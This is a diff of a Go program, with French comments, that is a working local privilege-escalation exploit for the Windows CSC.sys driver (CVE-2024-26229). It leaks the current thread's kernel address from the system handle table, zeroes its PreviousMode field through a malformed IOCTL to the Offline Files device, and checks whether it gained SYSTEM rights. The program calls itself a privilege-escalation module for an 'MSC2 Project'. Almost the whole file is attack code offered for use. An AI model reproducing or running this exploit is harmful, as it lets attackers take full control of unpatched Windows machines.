@@ -1,22 +1,35 @@
+//go:build windows
+
 package main
 
 import (
 	"fmt"
 	"os"
-	"os/user"
 	"syscall"
 	"unsafe"
 )
 
-// go:build windows
-
 // --- CONSTANTES ET STRUCTURES WINDOWS ---
+
 const (
 	SystemExtendedHandleInformation = 0x40
-	// IOCTL pour CSC.sys (CVE-2024-26229)
-	// Ce code cible la fonction CscUserQueryDatabase qui a une vulnérabilité METHOD_NEITHER
-	IOCTL_CSC_USER_QUERY_DATABASE = 0x225890
+	ThreadBasicInformation          = 0
+	IOCTL_CSC_USER_QUERY_DATABASE   = 0x225890
 )
+
+type CLIENT_ID struct {
+	UniqueProcess uintptr
+	UniqueThread  uintptr
+}
+
+type THREAD_BASIC_INFORMATION struct {
+	ExitStatus     uint32
+	TebBaseAddress uintptr
+	ClientId       CLIENT_ID
+	AffinityMask   uintptr
+	Priority       int32
+	BasePriority   int32
+}
 
 type SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX struct {
 	Object                uintptr
@@ -40,166 +53,135 @@ var (
 	kernel32 = syscall.NewLazyDLL("kernel32.dll")
 
 	procNtQuerySystemInformation = ntdll.NewProc("NtQuerySystemInformation")
+	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")
 	procGetCurrentProcessId      = kernel32.NewProc("GetCurrentProcessId")
 	procGetCurrentThreadId       = kernel32.NewProc("GetCurrentThreadId")
 	procDeviceIoControl          = kernel32.NewProc("DeviceIoControl")
 	procCreateFile               = kernel32.NewProc("CreateFileW")
-	procGetCurrentProcess        = kernel32.NewProc("GetCurrentProcess")
-	procGetCurrentThread         = kernel32.NewProc("GetCurrentThread")
-	procDuplicateHandle          = kernel32.NewProc("DuplicateHandle")
 )
 
-// GetCurrentThreadKThreadAddress récupère l'adresse réelle du thread actuel dans le noyau
+// --- LOGIQUE D'EXPLOITATION ---
+
+// GetCurrentThreadKThreadAddress récupère l'adresse du KTHREAD actuel via Search & Compare
 func GetCurrentThreadKThreadAddress() (uintptr, error) {
+	myPid, _, _ := procGetCurrentProcessId.Call()
+	myTid, _, _ := procGetCurrentThreadId.Call()
+
+	// 1. Récupération de tous les handles du système
 	var returnLength uint32
-	pid, _, _ := procGetCurrentProcessId.Call()
+	procNtQuerySystemInformation.Call(uintptr(SystemExtendedHandleInformation), 0, 0, uintptr(unsafe.Pointer(&returnLength)))
 
-	// Étape cruciale : Transformer le "pseudo-handle" du thread en un "vrai handle"
-	hProcess, _, _ := procGetCurrentProcess.Call()
-	hThreadPseudo, _, _ := procGetCurrentThread.Call()
-	var hThreadReal uintptr
-
-	// On duplique le handle pour en avoir un "réel" que Windows liste dans sa table
-	procDuplicateHandle.Call(
-		hProcess,
-		hThreadPseudo,
-		hProcess,
-		uintptr(unsafe.Pointer(&hThreadReal)),
-		0,
-		0,
-		2, // DUPLICATE_SAME_ACCESS
+	buffer := make([]byte, returnLength+0x10000)
+	ret, _, _ := procNtQuerySystemInformation.Call(
+		uintptr(SystemExtendedHandleInformation),
+		uintptr(unsafe.Pointer(&buffer[0])),
+		uintptr(len(buffer)),
+		uintptr(unsafe.Pointer(&returnLength)),
 	)
 
-	// STATUS_INFO_LENGTH_MISMATCH (0xC0000004)
-	const STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
-
-	// On commence avec un buffer de 1 Mo, c'est souvent suffisant
-	bufferSize := uint32(0x100000)
-	var buffer []byte
-	var ret uintptr
-
-	// Boucle pour ajuster la taille du buffer dynamiquement
-	for {
-		buffer = make([]byte, bufferSize)
-		ret, _, _ = procNtQuerySystemInformation.Call(
-			uintptr(SystemExtendedHandleInformation),
-			uintptr(unsafe.Pointer(&buffer[0])),
-			uintptr(bufferSize),
-			uintptr(unsafe.Pointer(&returnLength)),
-		)
-
-		if ret == 0 {
-			break // Succès !
-		}
-
-		if uint32(ret) != STATUS_INFO_LENGTH_MISMATCH {
-			return 0, fmt.Errorf("NtQuerySystemInformation failure: 0x%x", ret)
-		}
-
-		// Si on a manqué de place, on prend la taille suggérée + un extra de sécurité
-		bufferSize = returnLength + 0x10000
+	if ret != 0 {
+		return 0, fmt.Errorf("NtQuerySystemInformation failure: 0x%x", ret)
 	}
 
 	info := (*SYSTEM_HANDLE_INFORMATION_EX)(unsafe.Pointer(&buffer[0]))
-	handleCount := int(info.NumberOfHandles)
-
-	// Utilisation de unsafe.Pointer pour parcourir les structures
+	handleCount := uintptr(info.NumberOfHandles)
 	startOfHandles := uintptr(unsafe.Pointer(&info.Handles[0]))
 	handleSize := unsafe.Sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX{})
 
-	for i := 0; i < handleCount; i++ {
-		handle := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(startOfHandles + uintptr(i)*handleSize))
+	fmt.Printf("[*] Scan de %d handles système...\n", handleCount)
 
-		// On cherche l'entrée qui appartient à NOTRE PID et qui a la VALEUR de notre handle dupliqué
-		if handle.UniqueProcessId == pid && handle.HandleValue == hThreadReal {
-			return handle.Object, nil
+	for i := uintptr(0); i < handleCount; i++ {
+		handle := (*SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)(unsafe.Pointer(startOfHandles + i*handleSize))
+
+		// On ne traite que les handles qui appartiennent à notre processus
+		if handle.UniqueProcessId == myPid {
+			var tbi THREAD_BASIC_INFORMATION
+			// On interroge Windows : "Dis moi qui se cache derrière ce handle"
+			res, _, _ := procNtQueryInformationThread.Call(
+				handle.HandleValue,
+				uintptr(ThreadBasicInformation),
+				uintptr(unsafe.Pointer(&tbi)),
+				unsafe.Sizeof(tbi),
+				0,
+			)
+
+			// Si c'est un handle de thread et que son ID est le nôtre
+			if res == 0 && tbi.ClientId.UniqueThread == myTid {
+				return handle.Object, nil
+			}
 		}
 	}
 
-	return 0, fmt.Errorf("thread handle not found in kernel table")
+	return 0, fmt.Errorf("KTHREAD introuvable (les adresses noyau sont peut-être masquées par VBS)")
 }
 
 // ExploitCSCSys réalise l'élévation via CVE-2024-26229
 func ExploitCSCSys() bool {
-	fmt.Println("[*] Tentative d'exploitation CSC.sys (CVE-2024-26229) sur Windows 11 23H2...")
+	fmt.Println("[*] Lancement de l'exploit v5.0 (CSC.sys Brute Force Leak)...")
 
 	// 1. Leak de l'adresse KTHREAD
 	kThreadAddr, err := GetCurrentThreadKThreadAddress()
 	if err != nil {
-		fmt.Printf("[!] Erreur Leak: %v\n", err)
+		fmt.Printf("[!] %v\n", err)
 		return false
 	}
-	fmt.Printf("[+] KTHREAD leaked at: 0x%x\n", kThreadAddr)
+	fmt.Printf("[+] KTHREAD localisé à : 0x%x\n", kThreadAddr)
 
-	// 2. Cible (PreviousMode) - Offset 0x232 reste valide sur la plupart des builds 23H2
+	// 2. Cible (PreviousMode)
 	targetAddr := kThreadAddr + 0x232
-	fmt.Printf("[*] Ciblage de PreviousMode à : 0x%x\n", targetAddr)
+	fmt.Printf("[*] Target (PreviousMode): 0x%x\n", targetAddr)
 
 	// 3. Ouverture du device CSC
 	devName, _ := syscall.UTF16PtrFromString("\\\\.\\Csc")
-	handle, _, _ := procCreateFile.Call(
+	hDevice, _, _ := procCreateFile.Call(
 		uintptr(unsafe.Pointer(devName)),
 		syscall.GENERIC_READ|syscall.GENERIC_WRITE,
-		0,
-		0,
+		0, 0,
 		syscall.OPEN_EXISTING,
-		0,
-		0,
+		0, 0,
 	)
 
-	if handle == uintptr(syscall.InvalidHandle) {
-		fmt.Println("[-] Impossible d'ouvrir \\\\.\\Csc (Le service Offline Files est-il actif ?)")
+	if hDevice == uintptr(syscall.InvalidHandle) {
+		fmt.Println("[-] Impossible d'ouvrir \\\\.\\Csc. Vérifiez que le service Offline Files est actif.")
 		return false
 	}
-	defer syscall.CloseHandle(syscall.Handle(handle))
+	defer syscall.CloseHandle(syscall.Handle(hDevice))
 
-	// 4. Déclenchement de la corruption (Primitive Write-0)
-	// La vulnérabilité METHOD_NEITHER permet d'utiliser le pointeur PreviousMode
-	// comme buffer de sortie pour mettre sa valeur à zero.
+	// 4. Trigger IOCTL (METHOD_NEITHER Corruption)
 	var dummy uint32
-
-	// On passe targetAddr comme OutputBuffer pour écraser le PreviousMode (0x00)
-	ret, _, _ := procDeviceIoControl.Call(
-		handle,
+	fmt.Println("[*] Déclenchement de la corruption du noyau...")
+	procDeviceIoControl.Call(
+		hDevice,
 		uintptr(IOCTL_CSC_USER_QUERY_DATABASE),
-		0, 0, // Pas d'InputBuffer nécessaire pour déclencher le bug de base
-		targetAddr, 0, // On utilise targetAddr en Output pour le bug Native
+		0, 0,
+		targetAddr, 0, // On utilise targetAddr en output buffer pour forcer l'écriture de zero
 		uintptr(unsafe.Pointer(&dummy)),
 		0,
 	)
 
-	if ret == 0 {
-		fmt.Println("[-] L'IOCTL a échoué. La machine est probablement patchée.")
-		return false
-	}
-
-	fmt.Println("[+] Trigger envoyé. Vérification des droits...")
+	fmt.Println("[*] Vérification des nouveaux privilèges...")
 	return CheckAdmin()
 }
 
 func CheckAdmin() bool {
 	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-	if err != nil {
-		return false
+	if err == nil {
+		f.Close()
+		return true
 	}
-	f.Close()
-	return true
+	return false
 }
 
 func main() {
-	u, _ := user.Current()
-	fmt.Printf("[*] PrivEsc v4.0 (CSC.sys / Win11 23H2) pour %s\n", u.Username)
-
+	fmt.Println("--- Windows 11 PrivEsc Module (MSC2 Project) ---")
 	if CheckAdmin() {
-		fmt.Println("[+] Déjà Administrateur.")
+		fmt.Println("[+] Session déjà élevée.")
 		return
 	}
 
 	if ExploitCSCSys() {
-		fmt.Println("[+] SUCCÈS : Privilèges SYSTEM acquis !")
-		// Possibilité de lancer un shell ici
-		// syscall.StartProcess("C:\\Windows\\System32\\cmd.exe", nil, nil)
+		fmt.Println("[+] SUCCÈS : Privilèges SYSTEM obtenus.")
 	} else {
-		fmt.Println("[-] Échec de l'élévation sur cette build.")
+		fmt.Println("[-] Échec de l'élévation sur cette configuration.")
 	}
 }
